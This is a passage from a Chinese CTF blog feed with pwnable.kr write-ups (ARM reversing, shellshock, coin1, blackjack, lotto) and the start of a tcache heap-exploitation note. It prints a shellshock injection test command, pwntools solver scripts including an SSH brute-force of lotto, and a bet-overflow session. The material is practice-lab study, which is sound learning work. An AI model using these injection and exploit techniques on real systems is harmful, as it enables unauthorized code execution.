&lt;+108&gt;:   ldr   r0, [pc, #32]   ; 0x8dd0 &lt;main+148&gt;<br> 0x00008dac &lt;+112&gt;:   bl   0x1050c <puts><br> 0x00008db0 &lt;+116&gt;:   mov   r3, #0<br> 0x00008db4 &lt;+120&gt;:   mov   r0, r3<br> 0x00008db8 &lt;+124&gt;:   sub   sp, r11, #8<br> 0x00008dbc &lt;+128&gt;:   pop   {r4, r11, pc}<br> 0x00008dc0 &lt;+132&gt;:   andeq   r10, r6, r12, lsl #9<br> 0x00008dc4 &lt;+136&gt;:   andeq   r10, r6, r12, lsr #9<br> 0x00008dc8 &lt;+140&gt;:       ; <UNDEFINED> instruction: 0x0006a4b0<br> 0x00008dcc &lt;+144&gt;:       ; <UNDEFINED> instruction: 0x0006a4bc<br> 0x00008dd0 &lt;+148&gt;:   andeq   r10, r6, r4, asr #9<br> `&#96;&#96;</UNDEFINED></UNDEFINED></puts></system></puts></key3></key2></key1></printf></p>
<p>\1. <strong><code>push &#123;r4, r11, lr&#125;</code></strong><br>   - 将 <code>r4</code>, <code>r11</code>, 和 <code>lr</code> 寄存器的值压入栈中，用于保存函数调用前的状态。</p>
<p>\2. <strong><code>add r11, sp, #8</code></strong><br>   - 设置 <code>r11</code> 为当前栈指针加上 8。这通常是为了创建一个新的帧指针（frame pointer）。</p>
<p>\3. <strong><code>sub sp, sp, #12</code></strong><br>   - 为局部变量分配空间，栈指针 <code>sp</code> 向下移动 12 字节。</p>
<p>\4. <strong><code>mov r3, #0</code></strong><br>   - 将 0 赋值给寄存器 <code>r3</code>。</p>
<p>\5. <strong><code>str r3, [r11, #-16]</code></strong><br>   - 将 <code>r3</code> 的值（0）存储到 <code>r11</code> 指向的位置的偏移量 -16 处。</p>
<p>\6. <strong><code>ldr r0, [pc, #104]</code></strong><br>   - 从程序计数器 <code>pc</code> 加 104 字节的地址处加载值到 <code>r0</code>。这通常是用于访问代码中的常量或数据。</p>
<p>\7. <strong><code>bl 0xfb6c &lt;printf&gt;</code></strong><br>   - 调用 <code>printf</code> 函数，<code>bl</code> 指令用于分支并链接，保存返回地址到链接寄存器 <code>lr</code>。</p>
<p>\8. <strong><code>sub r3, r11, #16</code></strong><br>   - 计算 <code>r11</code> 减去 16，结果存入 <code>r3</code>。</p>
<p>\9. <strong><code>ldr r0, [pc, #96]</code></strong><br>   - 从程序计数器 <code>pc</code> 加 96 字节的地址处加载值到 <code>r0</code>。</p>
<p>\10. <strong><code>mov r1, r3</code></strong><br>   - 将 <code>r3</code> 的值复制到 <code>r1</code>。</p>
<p>\11. <strong><code>bl 0xfbd8 &lt;__isoc99_scanf&gt;</code></strong><br>   - 调用 <code>scanf</code> 函数，<code>r0</code> 和 <code>r1</code> 作为参数传递。</p>
<p>\12. <strong><code>bl 0x8cd4 &lt;key1&gt;</code></strong><br>   - 调用 <code>key1</code> 函数。</p>
<p>\13. <strong><code>mov r4, r0</code></strong><br>   - 将 <code>key1</code> 函数返回值存储到 <code>r4</code>。</p>
<p>\14. <strong><code>bl 0x8cf0 &lt;key2&gt;</code></strong><br>   - 调用 <code>key2</code> 函数。</p>
<p>\15. <strong><code>mov r3, r0</code></strong><br>   - 将 <code>key2</code> 函数返回值存储到 <code>r3</code>。</p>
<p>\16. <strong><code>add r4, r4, r3</code></strong><br>   - 将 <code>r4</code> 和 <code>r3</code> 的值相加，结果存回 <code>r4</code>。</p>
<p>\17. <strong><code>bl 0x8d20 &lt;key3&gt;</code></strong><br>   - 调用 <code>key3</code> 函数。</p>
<p>\18. <strong><code>mov r3, r0</code></strong><br>   - 将 <code>key3</code> 函数返回值存储到 <code>r3</code>。</p>
<p>\19. <strong><code>add r2, r4, r3</code></strong><br>   - 将 <code>r4</code> 和 <code>r3</code> 的值相加，结果存回 <code>r2</code>。</p>
<p>\20. <strong><code>ldr r3, [r11, #-16]</code></strong><br>   - 从 <code>r11</code> 指向的位置的偏移量 -16 处加载值到 <code>r3</code>。</p>
<p>\21. <strong><code>cmp r2, r3</code></strong><br>   - 比较 <code>r2</code> 和 <code>r3</code> 的值。</p>
<p>\22. <strong><code>bne 0x8da8 &lt;main+108&gt;</code></strong><br>   - 如果 <code>r2</code> 和 <code>r3</code> 不相等，跳转到 <code>0x8da8</code> 地址处。</p>
<p>\23. <strong><code>ldr r0, [pc, #44]</code></strong><br>   - 从程序计数器 <code>pc</code> 加 44 字节的地址处加载值到 <code>r0</code>。</p>
<p>\24. <strong><code>bl 0x1050c &lt;puts&gt;</code></strong><br>   - 调用 <code>puts</code> 函数。</p>
<p>\25. <strong><code>ldr r0, [pc, #40]</code></strong><br>   - 从程序计数器 <code>pc</code> 加 40 字节的地址处加载值到 <code>r0</code>。</p>
<p>\26. <strong><code>bl 0xf89c &lt;system&gt;</code></strong><br>   - 调用 <code>system</code> 函数。</p>
<p>\27. <strong><code>b 0x8db0 &lt;main+116&gt;</code></strong><br>   - 无条件跳转到 <code>0x8db0</code> 地址处。</p>
<p>\28. <strong><code>ldr r0, [pc, #32]</code></strong><br>   - 从程序计数器 <code>pc</code> 加 32 字节的地址处加载值到 <code>r0</code>。</p>
<p>\29. <strong><code>bl 0x1050c &lt;puts&gt;</code></strong><br>   - 再次调用 <code>puts</code> 函数。</p>
<p>\30. <strong><code>mov r3, #0</code></strong><br>   - 将 0 赋值给 <code>r3</code>。</p>
<p>\31. <strong><code>mov r0, r3</code></strong><br>   - 将 <code>r3</code> 的值复制到 <code>r0</code>。</p>
<p>\32. **&#96;sub sp, r11</p>
</blockquote>
<p>但其实看不看得懂都不影响做题，只要知道那种函数再arm下返回值都是r0寄存器存储的， </p>
<p>key1，0x8cdc+8&#x3D;0x8CE4</p>
<p><img src="https://s2.loli.net/2024/08/19/L7EB5uoNz8QCbjm.png" alt="b604b79856a84838876c023b99442bb2.png"></p>
<p>key2,0x00008d04 + 8 + 4 &#x3D; 0x00008d0c</p>
<p><img src="https://s2.loli.net/2024/08/19/LIalFnVpDO1JM5q.png" alt="ed42bb558eba4c99b163c4818e430cc6.png"></p>
<p>key3，其中lr是返回地址，所以就是0x8d80</p>
<p><img src="https://s2.loli.net/2024/08/19/oQ8f1OjkHsz6nbT.png" alt="5193ddb4cf474f2980f87282be76edbf.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/exdVI7jpYsE25gS.png" alt="c26f932a5ed14a7381f28e78ff493a74.png"></p>
<p>最后将他们三个数相加得到key&#x3D;108400</p>
<p><img src="https://s2.loli.net/2024/08/19/QopZRxUyE6JKkBe.png" alt="632ae9a665b14996b0c1c5ce0d3a249f.png"></p>
<h5 id="第九题-mistake"><a href="#第九题-mistake" class="headerlink" title="第九题-mistake"></a>第九题-mistake</h5><p>有后门，直接看xor函数吧。</p>
<p><img src="https://s2.loli.net/2024/08/19/1vQY5ZACDuq2spr.png" alt="7dba3eee7773404c8f6467cd945de513.png"></p>
<p>就是与1异或，直接输入十个1然后异或结果就是十个0。</p>
<p><img src="https://s2.loli.net/2024/08/19/zHmoDnswQl5UtbO.png" alt="0f422b1314694682963b394eb1e3497d.png"></p>
<p>getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/4AKUodw7cyXvr9Y.png" alt="99e2cd6c0a394425bd699aa898315563.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/1wXP35ZmvoCuirN.png" alt="77d76a63685c4fadae168b7402519ab2.png"></p>
<h5 id="第十题-shellshock"><a href="#第十题-shellshock" class="headerlink" title="第十题-shellshock"></a>第十题-shellshock</h5><p>看一下源码就知道该怎么写了，其实。可以看到直接调用bash了。</p>
<p>直接使用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token string">'() &#123; :;&#125;; echo TEST'</span> ./bash <span class="token parameter variable">-c</span> <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>证明它存在。</p>
<p><img src="https://s2.loli.net/2024/08/19/jzFe4DrlBR3vPdM.png" alt="ae6e06fa3d844292b58b04b8ca1473da.png"></p>
<h5 id="第十一题-coin1"><a href="#第十一题-coin1" class="headerlink" title="第十一题-coin1"></a>第十一题-coin1</h5><p>这题，全英文用gpt帮我理解一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">要解决这个问题，你需要在有限的称量次数内找到那枚伪造的硬币。这个问题考验的是你的逻辑推理能力和优化称量策略的能力。通常情况下，使用**二分法**（或分组策略）是解决这种称量问题的最佳方法之一。

<span class="token comment">### 解决步骤：</span>

<span class="token number">1</span>. **初始条件**：你有 <span class="token variable"><span class="token variable">`</span>N<span class="token variable">`</span></span> 枚硬币，并且有 <span class="token variable"><span class="token variable">`</span>C<span class="token variable">`</span></span> 次称量机会。

<span class="token number">2</span>. **分组称量**：
   - 每次称量时，你将硬币分成两组来称量（或者更多组，如果 N 很大）。
   - 通过比较每组的总重量，你可以确定哪一组可能包含假币。

<span class="token number">3</span>. **减少搜索范围**：
   - 每次称量后，你可以缩小可能包含假币的硬币数量。
   - 继续将包含假币的那一组再分组称量，直到找出假币。

<span class="token comment">### 例子演示：</span>

假设有 <span class="token variable"><span class="token variable">`</span><span class="token number">8</span><span class="token variable">`</span></span> 枚硬币，且你有 <span class="token variable"><span class="token variable">`</span><span class="token number">3</span><span class="token variable">`</span></span> 次称量机会 <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token assign-left variable">N</span><span class="token operator">=</span><span class="token number">8</span>, <span class="token assign-left variable">C</span><span class="token operator">=</span><span class="token number">3</span><span class="token variable">`</span></span><span class="token punctuation">)</span>。

**第一次称量**：
- 把硬币分成两组，分别是 <span class="token variable"><span class="token variable">`</span><span class="token number">0</span>-3<span class="token variable">`</span></span> 和 <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span>。
- 选择 <span class="token variable"><span class="token variable">`</span><span class="token number">0</span>, <span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token variable">`</span></span> 四枚硬币称量，记下它们的总重量。
  - 如果总重量为 <span class="token variable"><span class="token variable">`</span><span class="token number">40</span><span class="token variable">`</span></span>（每枚硬币都是真币），那么假币在 <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span> 中。
  - 如果总重量为 <span class="token variable"><span class="token variable">`</span><span class="token number">39</span><span class="token variable">`</span></span>，那么假币在 <span class="token variable"><span class="token variable">`</span><span class="token number">0</span>-3<span class="token variable">`</span></span> 中。

**第二次称量**：
- 假设第一轮后怀疑假币在 <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span> 中，再将 <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span> 分成两组，<span class="token variable"><span class="token variable">`</span><span class="token number">4</span>, <span class="token number">5</span><span class="token variable">`</span></span> 和 <span class="token variable"><span class="token variable">`</span><span class="token number">6</span>, <span class="token number">7</span><span class="token variable">`</span></span>。
- 选择 <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>, <span class="token number">5</span><span class="token variable">`</span></span> 称量。
  - 如果总重量为 <span class="token variable"><span class="token variable">`</span><span class="token number">20</span><span class="token variable">`</span></span>，那么假币在 <span class="token variable"><span class="token variable">`</span><span class="token number">6</span>, <span class="token number">7</span><span class="token variable">`</span></span> 中。
  - 如果总重量为 <span class="token variable"><span class="token variable">`</span><span class="token number">19</span><span class="token variable">`</span></span>，那么假币在 <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>, <span class="token number">5</span><span class="token variable">`</span></span> 中。

**第三次称量**：
- 选择最后一组中的单个硬币进行称量即可确认假币是哪一个。

<span class="token comment">### 通用策略：</span>

- 每次称量后都将剩下的硬币数量减半，以最大化信息获取。
- 这个过程会随着硬币数量的减少而逐步缩小搜索范围，直到找到伪造的硬币。

<span class="token comment">### 数学分析：</span>

在最坏情况下，解决该问题所需的最大称量次数 <span class="token variable"><span class="token variable">`</span>C<span class="token variable">`</span></span> 满足以下条件：

<span class="token punctuation">\</span><span class="token punctuation">[</span>
<span class="token number">2</span>^C <span class="token punctuation">\</span>geq N
<span class="token punctuation">\</span><span class="token punctuation">]</span>

这意味着 <span class="token variable"><span class="token variable">`</span>C<span class="token variable">`</span></span> 次称量可以处理最多 <span class="token variable"><span class="token variable">`</span><span class="token number">2</span>^C<span class="token variable">`</span></span> 枚硬币。

<span class="token comment">### 总结：</span>

通过将硬币分组称量，你可以在有限的称量次数内逐步缩小假币所在的范围，最终确定那枚伪造的硬币。这是一种典型的分而治之的策略。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>直接随便开一个机子，然后在&#x2F;tmp里面创建一个py脚本打本地就行。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python(2) solve.py</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  N<span class="token punctuation">,</span> C <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"N=(\d+) C=(\d+)"</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  N <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span>
  C <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> C<span class="token punctuation">)</span>

  start<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">-</span><span class="token number">1</span>

  <span class="token keyword">while</span> start <span class="token operator">&lt;=</span> end <span class="token keyword">and</span> C <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>start <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    x <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>	<span class="token comment"># build range list</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    
    res <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> res <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      start <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>	<span class="token comment"># through first half</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      end <span class="token operator">=</span> mid<span class="token operator">-</span><span class="token number">1</span>		<span class="token comment"># through second half</span>
    C <span class="token operator">-=</span> <span class="token number">1</span>

  <span class="token keyword">while</span> C <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>	<span class="token comment"># use all the tries</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    C <span class="token operator">-=</span> <span class="token number">1</span>

  p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment"># final answer</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="第十二题-blackjack"><a href="#第十二题-blackjack" class="headerlink" title="第十二题-blackjack"></a>第十二题-blackjack</h5><p>这题好像是让我赚钱，没看懂随便写点数，就给他打通了。</p>
<blockquote>
<p> $ nc pwnable.kr 9009</p>
<pre><code>    222         111
   222 222       11111
   222  222      11 111
     222        111
     222        111
</code></pre>
<p>CCCCC   SS       DD     HHHHH   C   C<br> C   C   SS      D  D    H   H  C  C<br> C   C   SS      D   D   H      C  C<br> CCCCC   SS      D DD D   H      C C<br> C   C   SS     D DDDD D   H      CC C<br> C   C  SS     D    D   H      C  C<br> C   C  SS     D     D   H   H  C   C<br> CCCCCC   SSSSSSS  D     D   HHHHH   C   C</p>
<p>​            21<br>​    DDDDDDDD    HH     CCCCC   S   S<br>​     DD     H  H    C   C  S  S<br>​     DD    H   H   C      S  S<br>​     DD    H HH H   C      S S<br>​     DD    H HHHH H   C      SS S<br>​     DD    H    H   C      S  S<br>​    D  DD   H     H   C   S  S   C<br>​    DDD    H     H   CCCCC   S   S</p>
<p>​     222           111<br>​     222            111<br>​     222            111<br>​    222222222222222    111111111111111<br>​    2222222222222222   11111111111111111</p>
<pre><code>      Are You Ready?
     \----------------
        (Y/N)
         y
</code></pre>
<p>Enter 1 to Begin the Greatest Game Ever Played.<br> Enter 2 to See a Complete Listing of Rules.<br> Enter 3 to Exit Game. (Not Recommended)<br> Choice: 1</p>
<p>Cash: $500<br> -——<br> |S   |<br> |  6  |<br> |   S|<br> -——</p>
<p>Your Total is 6</p>
<p>The Dealer Has a Total of 8</p>
<p>Enter Bet: $111111111111</p>
<p> Would You Like to Hit or Stay?<br> Please Enter H to Hit or S to Stay.<br> s</p>
<p>You Have Chosen to Stay at 6. Wise Decision!</p>
<p>The Dealer Has a Total of 11<br> The Dealer Has a Total of 14<br> The Dealer Has a Total of 17<br> Dealer Has the Better Hand. You Lose.</p>
<p>You have 0 Wins and 1 Losses. Awesome!</p>
<p>Would You Like To Play Again?<br> Please Enter Y for Yes or N for No<br> y<br> YaY_I_AM_A_MILLIONARE_LOL</p>
<p> Cash: $558039085<br> -——<br> |H   |<br> |  K  |<br> |   H|<br> -——</p>
<p>Your Total is 10</p>
<p>The Dealer Has a Total of 5</p>
<p>Enter Bet: $</p>
</blockquote>
<p>应该是有溢出点，然后估计就是机组的知识了。</p>
<p><img src="https://s2.loli.net/2024/08/19/r1WRmxwEopJlLaF.png" alt="a6f877bc85a64a42a40a656cbee3b228.png"></p>
<h5 id="第十三题-lotto"><a href="#第十三题-lotto" class="headerlink" title="第十三题-lotto"></a>第十三题-lotto</h5><p>可以看到外层只要一次被命中，里层就执行6次正好满足条件了。他输的ascii要是1-45.</p>
<p><img src="https://s2.loli.net/2024/08/19/QObHFxG2aLu5KSk.png" alt="4d56948487234ccc9d72f3d69e0244a2.png"></p>
<p>随便找一个吧</p>
<p><img src="https://s2.loli.net/2024/08/19/KATPc5LokF31YIi.png" alt="4c7650075f854b9ebd3030798ca4bded.png"></p>
<p>exp，如果本地打的很慢，可以上传到服务器上打。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

sh <span class="token operator">=</span> ssh<span class="token punctuation">(</span><span class="token string">'lotto'</span><span class="token punctuation">,</span> <span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> sh<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">'./lotto'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'!!!!!!'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  _ <span class="token punctuation">,</span> ans <span class="token operator">=</span> io<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
  
  <span class="token keyword">if</span> <span class="token string">"bad"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ans<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>ans<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>最后得到flag</p>
<p><img src="https://s2.loli.net/2024/08/19/e7GxpZuWKoFfwMX.png" alt="cf9a102c4dae44c39cb0f5e21fd0ff07.png"></p>
]]></content>
      <categories>
        <category>学习</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache_attack的学习</title>
    <url>/2024/07/13/tcache-attack%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>之前找专业学长买的ctfshow的pwn题目，在学校的时候把栈方面打完了。因为本人是个懒猪所以一拖再拖，也就留到了现在。前面几个heap题目比较简单等我有时间在写。</p>
<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>首先我们得了解什么是Tcache？Tcache（Thread Cache）是glibc从２.２６版本开始引入得一个特性，旨在提升内存分配性能。学过机组得都知道这个就是哪个缓存，一般计算机在读取数据的时候有好几层缓存。但这也加大了对堆攻击的难度。</p>
<p>在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_perthread_struct</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span>
typedef <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> tcache_entry<span class="token punctuation">;</span>

<span class="token comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
typedef <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> tcache_perthread_struct<span class="token punctuation">;</span>

<span class="token keyword">static</span> __thread tcache_perthread_struct <span class="token operator">*</span>tcache <span class="token operator">=</span> NULL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span>
tcache_put <span class="token punctuation">(</span><span class="token class-name">mchunkptr</span> chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> chunk2mem <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  assert <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
tcache_get <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  assert <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  assert <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

